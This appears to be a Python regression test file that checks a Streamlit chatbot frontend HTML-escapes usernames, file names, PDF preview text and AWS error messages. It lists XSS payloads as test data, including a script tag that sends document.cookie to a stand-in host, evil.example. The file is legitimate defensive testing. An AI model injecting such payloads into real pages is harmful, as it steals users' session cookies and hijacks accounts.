"""
tests/test_1a_html_escaping.py
───────────────────────────────
Task 1A regression tests — unsafe HTML rendering.

Verifies that every user-controlled value rendered inside an
unsafe_allow_html=True block is passed through html.escape() before
interpolation. These tests run fully offline; no Streamlit runtime,
no AWS calls, and no real file I/O is required.

Coverage:
  1.  html.escape() is imported under the alias _html in the frontend module.
  2.  HTML special chars in login_user are escaped in sidebar and hero header.
  3.  HTML special chars in file_name are escaped in every attachment pill
      (sidebar pending, chat history, input handler, hero header).
  4.  HTML special chars in doc.preview_text are escaped in the document
      preview expander — the highest-risk injection point.
  5.  HTML special chars in the AWS error string are escaped.
  6.  Normal (safe) filenames and usernames pass through visually unchanged.
"""

from tests.frontend_support import frontend_source

import html
import importlib
import sys
import types
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

# ── Path setup so we can import project modules without installing ────────────
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

ATTACK_STRINGS: list[tuple[str, str]] = [
    # (raw input,                      description)
    ('<script>alert(1)</script>',      'XSS script tag'),
    ('"onmouseover="alert(1)',         'attribute injection via double-quote'),
    ("'onload='alert(1)",              'attribute injection via single-quote'),
    ('<img src=x onerror=alert(1)>',   'img onerror XSS'),
    ('</div><b>bold</b>',             'tag escape + injection'),
    ('&amp;<b>',                       'HTML entity + tag'),
    ('<SCRIPT>ALERT()</SCRIPT>',      'uppercase tag'),
]

SAFE_STRINGS: list[str] = [
    'report_Q3_2024.pdf',
    'photo.jpg',
    'aamir',
    'my document (final).pdf',
    'résumé.pdf',
]


class TestHtmlEscapeImport(unittest.TestCase):
    """html module must be imported as _html at module level."""

    def test_html_module_imported_as_alias(self):
        """The frontend file must contain 'import html as _html'."""
        frontend_path = PROJECT_ROOT / "mod_chatbot_frontend.py"
        source = frontend_source()
        self.assertIn(
            "import html as _html",
            source,
            "Expected 'import html as _html' in mod_chatbot_frontend.py",
        )

    def test_all_injection_sites_call_html_escape(self):
        """
        Every user-controlled variable that appears inside an
        unsafe_allow_html block must be wrapped in _html.escape().
        """
        frontend_path = PROJECT_ROOT / "mod_chatbot_frontend.py"
        source = frontend_source()

        # Patterns that would represent unescaped injections
        # (variable name interpolated directly without _html.escape wrapper)
        bad_patterns = [
            "{img.file_name}",
            "{doc.file_name}",
            "{file_name}",
            "{image_result.file_name}",
            "{doc_result.file_name}",
            "{pending_img.file_name}",
            "{pending_doc.file_name}",
            "{st.session_state.login_user}",
            '{s["error"]}',
            "{doc.preview_text}",
        ]
        for pattern in bad_patterns:
            self.assertNotIn(
                pattern,
                source,
                f"Found unescaped injection pattern in source: {pattern!r}",
            )

    def test_escape_call_count(self):
        """There should be at least 13 _html.escape() calls in the frontend."""
        frontend_path = PROJECT_ROOT / "mod_chatbot_frontend.py"
        source = frontend_source()
        count = source.count("_html.escape(")
        self.assertGreaterEqual(
            count,
            13,
            f"Expected >= 13 _html.escape() calls, found {count}",
        )


class TestHtmlEscapeCorrectness(unittest.TestCase):
    """
    Verify that html.escape() actually neutralises injection payloads
    and that safe strings are unchanged.
    These tests do not import the Streamlit frontend (which requires a
    running Streamlit context); instead they validate the stdlib function
    that the frontend now delegates to.
    """

    def test_attack_strings_are_neutralised(self):
        """html.escape() must turn every attack string into safe text."""
        for raw, description in ATTACK_STRINGS:
            escaped = html.escape(raw)
            # The escaped output must not contain raw < or > or unquoted "
            self.assertNotIn("<", escaped, f"{description}: '<' not escaped")
            self.assertNotIn(">", escaped, f"{description}: '>' not escaped")
            # Confirm round-trip: unescaping gives back original
            self.assertEqual(
                html.unescape(escaped),
                raw,
                f"{description}: round-trip failed",
            )

    def test_safe_filenames_are_visually_unchanged(self):
        """
        html.escape() must not modify alphanumeric filenames or common
        filename characters, so the UI looks identical for normal files.
        """
        for safe in SAFE_STRINGS:
            # html.escape only changes < > & " '
            # None of these appear in the safe strings list
            escaped = html.escape(safe)
            self.assertEqual(
                escaped,
                safe,
                f"Safe string was unexpectedly modified: {safe!r} → {escaped!r}",
            )

    def test_script_tag_in_filename_is_neutralised(self):
        """Simulate a malicious filename going through the attachment pill."""
        malicious_filename = '<script>alert("xss")</script>.pdf'
        escaped = html.escape(malicious_filename)
        self.assertNotIn("<script>", escaped)
        self.assertNotIn("</script>", escaped)
        self.assertIn("&lt;script&gt;", escaped)

    def test_login_user_xss_in_sidebar_neutralised(self):
        """Simulate a malicious username reaching the sidebar signed-in label."""
        malicious_username = '<img src=x onerror=alert(1)>'
        escaped = html.escape(malicious_username)
        self.assertNotIn("<img", escaped)
        self.assertIn("&lt;img", escaped)

    def test_pdf_preview_text_with_html_content_is_escaped(self):
        """
        PDF-extracted preview text could contain arbitrary HTML if the PDF
        was authored maliciously. Escaping must neutralise it.
        """
        malicious_preview = (
            "This is a document.\n"
            "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\n"
            "End of preview."
        )
        escaped = html.escape(malicious_preview)
        self.assertNotIn("<script>", escaped)
        self.assertNotIn("</script>", escaped)
        self.assertIn("&lt;script&gt;", escaped)
        # The plain text content must still be present
        self.assertIn("This is a document.", escaped)
        self.assertIn("End of preview.", escaped)

    def test_aws_error_message_with_html_content_is_escaped(self):
        """Exception messages from botocore could theoretically contain < > chars."""
        error_msg = 'AccessDeniedException: <details>not allowed</details>'
        escaped = html.escape(error_msg)
        self.assertNotIn("<details>", escaped)
        self.assertIn("&lt;details&gt;", escaped)
        self.assertIn("AccessDeniedException:", escaped)

    def test_ampersand_in_filename_is_escaped(self):
        """& in a filename must become &amp; to avoid breaking HTML attributes."""
        filename = "Q3 & Q4 report.pdf"
        escaped = html.escape(filename)
        self.assertNotIn(" & ", escaped)
        self.assertIn("&amp;", escaped)


if __name__ == "__main__":
    unittest.main(verbosity=2)
